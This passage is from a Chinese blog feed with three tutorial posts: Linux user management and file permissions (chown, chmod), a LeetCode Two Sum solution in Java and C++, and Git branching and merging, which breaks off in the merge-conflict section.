src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937859202" alt="加入用户组"></p><h3 id="删除用户">删除用户</h3><p>使用<code>deluser</code>命令删除用户：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo deluser lilei --remove-home</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937860913" alt="删除用户"></p><h2 id="Linux文件权限">Linux文件权限</h2><h3 id="列出文件">列出文件</h3><ul><li>使用长格式列出文件：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937863052" alt="长格式列出文件"></p><ul><li>查看全部文件（包括隐藏文件）</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -A</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937865050" alt="查看全部文件"></p><ul><li>使用长格式列出所有文件</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -Al</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937868681" alt="长格式列出所有文件"></p><ul><li>查看目录完整属性</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -dl &lt;dirname&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937871460" alt="查看目录完整属性"></p><ul><li>显示所有文件大小</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -AsSh</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937873687" alt="显示所有文件大小"></p><h3 id="查看文件">查看文件</h3><p>使用<code>cat &lt;filename&gt;</code>命令读取文件内容</p><h3 id="变更文件所有者">变更文件所有者</h3><ul><li>新建<code>iphone6</code>目录，查看目录创建人</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su lilei</span><br><span class="line"><span class="built_in">cd</span> /home/lilei</span><br><span class="line">touch iphone6</span><br><span class="line">ll iphone6</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937876019" alt="查看文件创建人"></p><ul><li>切换身份，并变更创建人身份</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su shiyanlou</span><br><span class="line"><span class="built_in">cd</span> /home/lilei</span><br><span class="line">ls iphone6</span><br><span class="line">sudo chown shiyanlou iphone6</span><br><span class="line">ll iphone6</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230917153225613.png" alt="变更创建人"></p><h3 id="修改文件权限">修改文件权限</h3><h4 id="方法一-二进制数字表示">方法一 二进制数字表示</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="tag">&lt;<span class="name">rwx</span>&gt;</span> <span class="tag">&lt;<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>文件调用权限分为三级 :</p><ul><li>文件所有者（Owner）</li><li>用户组（Group）</li><li>其它用户（Other Users）</li></ul></li><li><p>权限分为三种：</p><ul><li>可读（Read）</li><li>可写（Write）</li><li>可执行（Execute）</li></ul><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/file-permissions-rwx.jpg" alt="img"></p></li></ul><blockquote><p>每个文件的三组权限（拥有者，所属用户组，其他用户，<strong>记住这个顺序是一定的</strong>）对应一个 &quot; rwx &quot;，也就是一个 “ 7 ”</p><p><img src="https://doc.shiyanlou.com/linux_base/3-14.png" alt="img"></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;<span class="built_in">echo</span> \&quot;hello shiyanlou\&quot;&quot; &gt; iphone6</span><br><span class="line">chmod <span class="number">600</span> iphone6</span><br><span class="line">ll iphone6</span><br><span class="line">su lilei</span><br><span class="line">cat /home/lilei/iphone6</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937882239" alt="修改权限1"></p><h4 id="方法二-符号表示">方法二 符号表示</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;<span class="name">op</span>&gt;</span><span class="tag">&lt;<span class="name">permission</span>&gt;</span> <span class="tag">&lt;<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>用户组部分表示：</p><table><thead><tr><th style="text-align:left">who</th><th style="text-align:left">用户类型</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>u</code></td><td style="text-align:left">user</td><td style="text-align:left">文件所有者</td></tr><tr><td style="text-align:left"><code>g</code></td><td style="text-align:left">group</td><td style="text-align:left">文件所有者所在组</td></tr><tr><td style="text-align:left"><code>o</code></td><td style="text-align:left">others</td><td style="text-align:left">所有其他用户</td></tr><tr><td style="text-align:left"><code>a</code></td><td style="text-align:left">all</td><td style="text-align:left">所有用户, 相当于 <em>ugo</em></td></tr></tbody></table></li><li><p>符号部分表示：</p><table><thead><tr><th style="text-align:left">Operator</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>+</code></td><td style="text-align:left">为指定的用户类型增加权限</td></tr><tr><td style="text-align:left"><code>-</code></td><td style="text-align:left">去除指定用户类型的权限</td></tr><tr><td style="text-align:left"><code>=</code></td><td style="text-align:left">设置指定用户权限的设置，即将用户类型的所有权限重新设置</td></tr></tbody></table></li><li><p>权限部分表示：</p><table><thead><tr><th style="text-align:left">模式</th><th style="text-align:left">名字</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>r</code></td><td style="text-align:left">读</td><td style="text-align:left">设置为可读权限</td></tr><tr><td style="text-align:left"><code>w</code></td><td style="text-align:left">写</td><td style="text-align:left">设置为可写权限</td></tr><tr><td style="text-align:left"><code>x</code></td><td style="text-align:left">执行权限</td><td style="text-align:left">设置为可执行权限</td></tr><tr><td style="text-align:left"><code>X</code></td><td style="text-align:left">特殊执行权限</td><td style="text-align:left">只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td></tr><tr><td style="text-align:left"><code>s</code></td><td style="text-align:left">setuid/gid</td><td style="text-align:left">当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</td></tr><tr><td style="text-align:left"><code>t</code></td><td style="text-align:left">粘贴位</td><td style="text-align:left">设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td></tr></tbody></table></li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod go-rw iphone6</span><br></pre></td></tr></table></figure><h3 id="adduser-useradd">adduser &amp; useradd</h3><blockquote><p>useradd 只创建用户，创建完了用 passwd lilei 去设置新用户的密码。adduser 会创建用户，创建目录，创建密码（提示你设置），做这一系列的操作。其实 useradd、userdel 这类操作更像是一种命令，执行完了就返回。而 adduser 更像是一种程序，需要你输入、确定等一系列操作。</p></blockquote><h2 id="实战训练">实战训练</h2><p><strong>题目</strong></p><blockquote><p>添加一个用户 <code>loutest</code>，使用 <code>sudo</code> 创建文件 <code>/opt/forloutest</code>，设置成用户 <code>loutest</code> 可以读写。</p></blockquote><ol><li><p>添加用户<code>loutest</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser loutest</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937214794" alt="添加用户"></p></li><li><p>创建文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /opt/forloutest</span><br></pre></td></tr></table></figure></li><li><p>设置读写权限并测试</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chown loutest:loutest /opt/forloutest</span><br><span class="line">sudo chmod <span class="number">600</span> /opt/forloutest</span><br><span class="line">cat /opt/forloutest</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937457242" alt="权限设置"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LC 1. 两数之和</title>
      <link href="/posts/d98ef1d2.html"/>
      <url>/posts/d98ef1d2.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述">题目描述</h2><ul><li>序号：1</li><li>题目：两数之和</li><li>难度：简单</li><li>标签：数组、哈希表</li></ul><details class="folding-tag" open><summary> 题目描述 </summary>              <div class='content'>              <blockquote><p>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p><strong>示例 1：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = <span class="comment">[2,7,11,15]</span>, target = 9</span><br><span class="line">输出：<span class="comment">[0,1]</span></span><br><span class="line">解释：因为 nums<span class="comment">[0]</span> + nums<span class="comment">[1]</span> == 9 ，返回 <span class="comment">[0, 1]</span> 。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = <span class="comment">[3,2,4]</span>, target = 6</span><br><span class="line">输出：<span class="comment">[1,2]</span></span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = <span class="comment">[3,3]</span>, target = 6</span><br><span class="line">输出：<span class="comment">[0,1]</span></span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li>$2 &lt;= nums.length &lt;= 10^4$</li><li>$-10^9 &lt;= nums[i] &lt;= 10^9$</li><li>$-10^9 &lt;= target &lt;= 10^9$</li><li><strong>只会存在一个有效答案</strong></li></ul><p><strong>进阶：</strong> 你可以想出一个时间复杂度小于 <code>O(n2)</code> 的算法吗？</p></blockquote>              </div>            </details><hr><h2 id="题解-方法1（枚举法）">题解-方法1（枚举法）</h2><h3 id="思路">思路</h3><ul><li>暴力枚举</li><li>遍历数组中所有的数字，查找符合求和满足条件的值。内层循环查找的开始位置可以是外层循环位置的后一位，因为前方的值已经匹配过，无需遍历。</li></ul><h3 id="代码">代码</h3><div class="tabs" id="代码"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#代码-1">Java</button></li><li class="tab"><button type="button" data-href="#代码-2">C++</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="代码-1"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j] == target)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="代码-2"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i, j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="复杂度分析">复杂度分析</h3><ul><li>时间复杂度：$O(n^2)$</li><li>空间复杂度：$O(1)$</li></ul><h2 id="题解-方法2（哈希表）">题解-方法2（哈希表）</h2><h3 id="思路-2">思路</h3><ul><li>哈希表</li><li>通过哈希表可以将内层时间复杂度O(n)降为O(1)。在哈希表中询问是否存在<code>target - nums[i]</code>的值，不存在则将当前值存入哈希表。</li></ul><h3 id="代码-2">代码</h3><div class="tabs" id="代码"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#代码-1">Java</button></li><li class="tab"><button type="button" data-href="#代码-2">C++</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="代码-1"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; hashTable = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashTable.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;hashTable.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashTable.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="代码-2"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hashTable;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashTable.<span class="built_in">find</span>(target - nums[i]) != hashTable.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;hashTable[target - nums[i]], i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashTable[nums[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="复杂度分析-2">复杂度分析</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 数组 </tag>
            
            <tag> 哈希表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git分支管理</title>
      <link href="/posts/935337f5.html"/>
      <url>/posts/935337f5.html</url>
      
        <content type="html"><![CDATA[<h2 id="分支创建与切换">分支创建与切换</h2><ul><li><p>创建一个分支可以使用<code>git branch</code>命令，比如可以使用这个语句创建一个testing分支，这会在当前所在的提交对象上创建一个指针：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch testing</span><br></pre></td></tr></table></figure></li><li><p>创建完testing分支后，情况如下：</p><p><img src="https://git-scm.com/book/en/v2/images/head-to-master.png" alt="HEAD 指向当前所在的分支。"></p></li><li><p>使用<code>git branch</code>创建好分支后并不会自动切换到新的分支，切换到一个分支，可以使用<code>git checkout</code>命令，比如这条命令将会切换HEAD指针到testing分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout testing</span><br></pre></td></tr></table></figure></li><li><p>HEAD指针指向了testing分支</p><p><img src="https://git-scm.com/book/en/v2/images/head-to-testing.png" alt="HEAD 指向当前所在的分支。"></p></li><li><p>当然，Git也可以在创建分支的同时切换到当前分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b &lt;branch-name&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="分支提交">分支提交</h2><ul><li><p>HEAD当前指向testing分支，那么现在更新一些内容然后进行提交：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim test.rb</span><br><span class="line">git commit -a -m &#x27;update testing&#x27;</span><br></pre></td></tr></table></figure></li><li><p>提交完成后，分支情况就变成现在这样：</p><p><img src="https://git-scm.com/book/en/v2/images/advance-testing.png" alt="HEAD 分支随着提交操作自动向前移动。"></p></li><li><p>如果现在再将HEAD移动回master分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/checkout-master.png" alt="检出时 HEAD 随之移动。"></p><p>这个时候，你的工作目录和你在开始修改tetsing分支之前一模一样。当你切换分支的时候，Git 会重置你的工作目录，使其看起来像回到了你在那个分支上最后一次提交的样子。 Git 会自动添加、删除、修改文件以确保此时你的工作目录和这个分支最后一次提交时的样子一模一样。</p></li><li><p>现在在master分支下再进行一次修改并提交：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim test.rb</span><br><span class="line">git commit -a -m &#x27;update master&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/advance-master.png" alt="项目分叉历史。"></p></li></ul><h2 id="项目分叉历史">项目分叉历史</h2><ul><li><p>查看当前项目的分叉历史，可以使用<code>git log</code>命令进行查看，它会输出提交历史、各个分支的指向以及项目的分支分叉情况：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --oneline --decorate --graph --all</span></span><br><span class="line">* c2b9e (HEAD, master) update master</span><br><span class="line">| * 87ab2 (testing) update testing</span><br><span class="line">|/</span><br><span class="line">* f30ab add feature #32 - ability to add new formats to the</span><br><span class="line">* 34ac2 fixed bug #1328 - stack overflow under certain conditions</span><br><span class="line">* 98ca9 initial commit of my project</span><br></pre></td></tr></table></figure></li><li><p>Git的分支实质上仅是包含所指对象校验和（长度为40的SHA-1值字符串）的文件，所以创建和销毁分支都可以做到非常的高效。</p></li></ul><h2 id="删除分支">删除分支</h2><ul><li><p>使用带有<code>-d</code>的<code>git branch</code>命令可以删除分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d testing</span><br></pre></td></tr></table></figure></li></ul><h2 id="合并分支">合并分支</h2><ul><li><p>假设当前已有master分支如下：</p><p><img src="https://git-scm.com/book/en/v2/images/basic-branching-1.png" alt="一个简单的提交历史。"></p></li><li><p>现在，需要解决追踪系统的#53问题，新建了一个iss53分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch iss53</span><br><span class="line">git checkout iss53</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/basic-branching-2.png" alt="创建一个新分支指针。"></p></li><li><p>现在在iss53分支进行了一些更改：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim index.html</span><br><span class="line">git commit -a -m &#x27;added a new footer [issue 53]&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/basic-branching-3.png" alt=" 分支随着工作的进展向前推进。"></p></li></ul><h3 id="快进式（fast-forward）合并">快进式（fast-forward）合并</h3><ul><li><p>现在需要对主分支进行一次紧急修复，切换到master分支并进行一次热修复：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git checkout -b hotfix</span><br><span class="line">vim index.html</span><br><span class="line">git commit -a -m &#x27;fixed the broken email address&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/basic-branching-4.png" alt="基于  分支的紧急问题分支（hotfix branch）。"></p></li><li><p>经过检验，热修复分支解决了问题，那么现在需要将master分支与hotfix分支进行合并：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout master</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge hotfix</span></span><br><span class="line">Updating f42c576..3a0874c</span><br><span class="line">Fast-forward</span><br><span class="line"> index.html | 2 ++</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br></pre></td></tr></table></figure><p>由于你想要合并的分支 <code>hotfix</code> 所指向的提交 <code>C4</code> 是你所在的提交 <code>C2</code> 的直接后继， 因此 Git 会直接将指针向前移动。换句话说，当你试图合并两个分支时， 如果顺着一个分支走下去能够到达另一个分支，那么 Git 在合并两者的时候， 只会简单的将指针向前推进（指针右移），因为这种情况下的合并操作没有需要解决的分歧——这就叫做 “快进（fast-forward）”。</p><p><img src="https://git-scm.com/book/en/v2/images/basic-branching-5.png" alt=" 被快进到 。"></p></li></ul><h3 id="二路合并">二路合并</h3><ul><li>二路合并是最简单的一种合并方式，将两个文件进行逐行比对，如果行内容有差异就报冲突，这时候就需要人工合并差异了。</li></ul><h3 id="三路合并（递归三路合并）">三路合并（递归三路合并）</h3><ul><li><p>对于较少差异的分支，使用二路合并尚且可以接受，但对于较大差异的分支，使用二路合并就非常麻烦了。因此出现了三路合并方法：首先找到两个分支的共同父节点（Base），如果A分支对某内容进行了修改，B分支对这个内容未进行修改，那么会应用A分支的修改，反之应用B分支的修改。</p><p><img src="https://upload-images.jianshu.io/upload_images/11893784-6b0f41a62e828d38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p></li><li><p>回到之前的情景。解决完紧急问题后，需要恢复到之前的工作中，进行后续工作的提交。同时删除hotfix分支，因为已经完成了此次修复，不再需要：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -d hotfix</span></span><br><span class="line">Deleted branch hotfix (3a0874c).</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout iss53</span></span><br><span class="line">Switched to branch &quot;iss53&quot;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim index.html</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -a -m <span class="string">&#x27;finished the new footer [issue 53]&#x27;</span></span></span><br><span class="line">[iss53 ad82d7a] finished the new footer [issue 53]</span><br><span class="line">1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/basic-branching-6.png" alt="继续在  分支上的工作。"></p></li><li><p>现在iss53问题已经被修复，需要与master分支进行合并：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout master</span></span><br><span class="line">Switched to branch &#x27;master&#x27;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge iss53</span></span><br><span class="line">Merge made by the &#x27;recursive&#x27; strategy.</span><br><span class="line">index.html |    1 +</span><br><span class="line">1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/basic-merging-1.png" alt="一次典型合并中所用到的三个快照。"></p></li><li><p>因为master分支并非是iss53分支的父节点，Git会对这两个分支进行一次简单的三路合并。虽然此次合并写作’recursive’策略，但并非递归三路合并，在Git的输出中，三路合并与递归三路合并都是’recursive’策略，递归三路合并策略通常用于更加复杂的合并场景。</p></li></ul><p><img src="https://git-scm.com/book/en/v2/images/basic-merging-2.png" alt="一个合并提交。"></p><h2 id="处理合并冲突">处理合并冲突</h2><ul><li><p>如果两个分支都对同一段内容做了更改，Git就无法完成合并操作，在合并时就会报合并冲突：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 